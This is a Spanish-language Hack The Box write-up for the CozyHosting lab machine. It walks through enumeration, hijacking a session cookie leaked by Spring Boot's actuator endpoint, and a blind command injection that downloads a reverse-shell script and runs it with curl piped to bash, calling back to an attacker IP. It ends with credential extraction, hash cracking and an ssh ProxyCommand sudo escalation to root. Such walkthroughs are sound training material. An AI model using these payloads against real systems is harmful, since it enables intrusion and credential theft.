---
title: Writeup cozyhosting - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - cozyhosting
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina cozyhosting en Hack The Box.
keywords:
  - writeup cozyhosting
  - hack the box cozyhosting
  - resolución máquina cozyhosting
  - cozyhosting hack the box
  - htb cozyhosting
---
------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/CozyHosting)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=KsuFK69L1bo)|[Parte2](https://www.youtube.com/watch?v=QyskUaGgmHA)
- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=SwVorOcC3bg)

---

#easy #linux #nmap #ping #postgresql #tratamientotty #commandinjection #cookiehijacking #/etc/hosts #abusobinariossh #sudo-l #whitelabelerrorpage #john #gobuster #whatweb #wappalyzer #reverseshell #grep #unzip #cd #mkdir #cp 

------
# Guided Mode

1)¿Cuántos puertos TCP están abiertos en Cozyhosting?
	2

2)El servidor web en el puerto TCP 80 emite una redirección a qué dominio?
	cozyhosting.htb

3)¿Qué ruta relativa en el servidor web devuelve un error 500?
	/error

4)¿Cuál es el marco web Java utilizado en la aplicación web?
	Spring Boot

5)¿Qué punto final está expuesto en Spring Boot y se usa principalmente para fines de depuración?
	/actuator

6)¿Cuál es el nombre de usuario del usuario cuya sesión está expuesta?
	kanderson

7)Cuando se envía una solicitud de publicación a /ejecutsesh, ¿cuál de los dos parámetros es vulnerable a la inyección de comando?
	username

8)¿A qué usuario se ejecuta la aplicación web?
	app

9)¿Cuál es la ruta completa al archivo Java que ejecuta la aplicación web?
	/app/cloudhosting-0.0.1.jar

10)¿Cuál es el nombre del archivo donde las propiedades relacionadas con la aplicación se almacenan en una aplicación de arranque de resorte?
	application.properties

11)¿Cuál es la contraseña del usuario administrativo para la aplicación web?
	manchesterunited

*La anterior pregunta es la flag del user.txt*
13)¿Cuál es la ruta completa del binario que el usuario de Josh puede ejecutar en la máquina como root?
	/usr/bin/ssh

--------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.11.230
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.230 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.10.11.230 -oN target
nmap -sU -n -Pn -vvv --top-ports 200 10.10.11.230 -oN udpScan
```

![[CozyHosting1.png]]

![[CozyHosting2.png]]
![[CozyHosting6.png]]

*TTL:* Maquina Linux
*Puertos TCP:*
	`22` [[ssh]]
	`80` HTTP
*Puertos UDP:*
	`68` dhcpc

----
# Agregar dominio a /etc/hosts

Entramos a la pagian y nos redirige a http://cozyhosting.htb/
![[CozyHosting3.png]]
Entonces vamos a ir al archivo */etc/hosts* lo vamos a modificar con [[nvim]] usando el comando `nvim /etc/hosts`

Le vamos a agregar el siguiente contenido al final de todo
```
10.10.11.230 cozyhosting.htb
```

![[CozyHosting4.png]]

Ya nos cargaria la pagina de forma normal
![[CozyHosting5.png]]



------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://cozyhosting.htb/
```

![[CozyHosting7.png]]

![[CozyHosting8.png]]

Nos da el el mail info@cozyhosting.htb
Informa que esta corriendo un nginx 1.18.0

-------
# [[Gobuster]]

```
gobuster dir -u http://cozyhosting.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 64
```
![[CozyHosting9.png]]
Encontramos el directorio */error* http://cozyhosting.htb/error

Que si entramos nos da esta este error
![[CozyHosting14.png]]

------
# [[Whitelabel Error Page]] y [[Cookie Hijacking]]

Si intentamos logearnos en la pagina http://cozyhosting.htb/login con cualquier usuario vemos que ya nos da una cookie de sesion

![[CozyHosting13.png]]
Y ahora vamos con [[Gobuster]] a usar el diccionario de spring-boot, ya que al ver la pagina con el /error podemos asumir que esta corriendo tecnologia spring-boot `gobuster dir -u http://cozyhosting.htb/ -w /usr/share/SecLists/Discovery/Web-Content/spring-boot.txt -t 64`

![[CozyHosting15.png]]
Nos da el directorio */actuator* http://cozyhosting.htb/actuator

Si entramos, vemos que nos da otros posibles directorios, asi que vamos a ir probando y una vez que entramos al
![[CozyHosting11.png]]
http://cozyhosting.htb/actuator/sessions
![[CozyHosting10.png]]
Nos da lo que serian unas cookies de sesion para el usuario kanderson

*66284B32C890C19F3225FFBA929C57A0	*
*8619210BF73587A8503EF4AD0398883E*	
Usuario: *kanderson*

Vamos a ir a http://cozyhosting.htb/login y vamos a cambiar nuestra cookie de sesion apretando *CTRL + SHIFT + I* y cambiando el valor de la cookie
![[CozyHosting12.png]]


---------
# [[Command Injection]]
La inyeccion es a ciegas, por lo que si pones un comando que te tire un output por ejemplo *;whoami* no lo vas a ver
![[CozyHosting16.png]]
Asi que creamos un archivo *rev.sh* para enviarnos una revershell

Contenido del archivo *rev.sh*
```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.15/443 0>&1'
```
![[CozyHosting20.png]]
Mientras estamos en escucha con [[nc -nlvp 443]] con el comando `nc -nlvp 443` para recibir la [[Reverse shell]] y con [[python3 -m http.server]] con el comando `python3 -m http.server 80` levantando un servidor de python para que se descargue el *rev.sh*

![[CozyHosting18.png]]

Vamos a poner el payload ``test;curl${IFS}http://10.10.16.15/rev.sh|bash;`` con *${IFS}* para inyectar los espacios en el payload, ya que si ponemos algun espacio en el comando, nos va a aparecer un error
![[Cozyhosting35.png]]

Ponemos el payload, y ya vamos a recibir la [[Reverse shell]]
![[CozyHosting19.png]]


![[CozyHosting17.png]]
Ya ganamos acceso como el usuario *app*

---
# [[Tratamiento de la TTY]]

--------
# Escalada de privilegios al usuario josh con [[Posibles archivos con contraseñas]], [[postgresql]] y [[john]]

Vamos a pasar el archivo *cloudhosting-0.0.1.jar* que tenemos el directorio de *app* a */tmp* pero para que este mas ordenado. Vamos a ir con [[cd]] a /tmp y vamos a crear una carpeta que se llame trabajo con [[mkdir]] usando `mkdir trabajo` y luego vamos ir de nuevo al directorio *app* con `cd..` y despues `cd app` para mover con [[cp]] `cp cloudhosting-0.0.0.1.jar /tmp/trabajo` Ahora vamos a ir con `cd /tmp/trabajo` y vamos a descomprimir el archivo con [[unzip]] usando `unzip cloudhosting-0.0.1.jar`

![[CozyHosting21.png]]

Vamos a buscar con [[grep]] posibles contraseñas en los archivos con el comando `grep -riE ".*password|password|password.*"`

![[CozyHosting23.png]]
Encuentro esta posible contraseña en el archivo *BOOT-INF/classes/application.properties*
Asi que lo voy a catear el archivo para ver toda la info completa con [[cat]] usando el comando `cat application.properties`
![[CozyHosting22.png]]
Y nos da estas credenciales
postgres:Vg&nvzAQ7XxR

### Conexion a base de datos [[postgresql]]

Nos vamos a conectar usando `psql -U postgres -h localhost -p 5432`
![[CozyHosting24.png]]
```posgresql
\l                   |para ver las bases de datos
\c cozyhosting                  |secrets para usar la base de datos
\dt                   |para ver las tablas y columnas
SELECT * FROM users;   | para listar todo el contenido de la tabla flag
```
![[CozyHosting26.png]]

Nos da la contraseña hasheada del usuario admin
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm 



### Crackeamos la contraseña con [[john]]

Cree un archivo contraseña.txt y puse la contraseña hasheada
![[CozyHosting29.png]]
Ahoravamos a crackearla usando el comando ``john contraseña.txt -w=/usr/share/wordlists/rockyou.txt``

![[CozyHosting27.png]]
nos da la contraseña *manchesterunited*

Vimos que esta el home del usuario josh, asi que probamos la contraseña que encontramos en ese usuario
![[CozyHosting31.png]]

Ahora con [[ssh]] nos vamos a conectar usando el comando `ssh josh@10.10.11.230 -p 22`
![[CozyHosting30.png]]
Ya escalamos al usuario josh

-------
# [[Tratamiento de la TTY]]

----
# Escalada al usuario root [[Abuso de Sudo]] con [[Binario SSH]]

```shell
sudo -l
```

![[CozyHosting33.png]]
Y nos muestra que podemos ejecutar el binario */usr/bin/ssh* como si fueramos *root*
Vamos a usar [[gtfsearch]] con el comando `gtfsearch ssh -t sudo`. Y nos va a mostrar que comando tenemos que usar para escalar privilegios
![[CozyHosting32.png]]
Utilizamos el comando, pero cambiando, para que nos de una bash, y poniendo la ruta absoluta del binario `sudo /usr/bin/ssh -o ProxyCommand=';bash 0<&2 1>&2' x`
Y listo ya somos root y podemos catear las flags
![[CozyHosting34.png]]

----
# Creditos

Writeup oficial HackTheBox



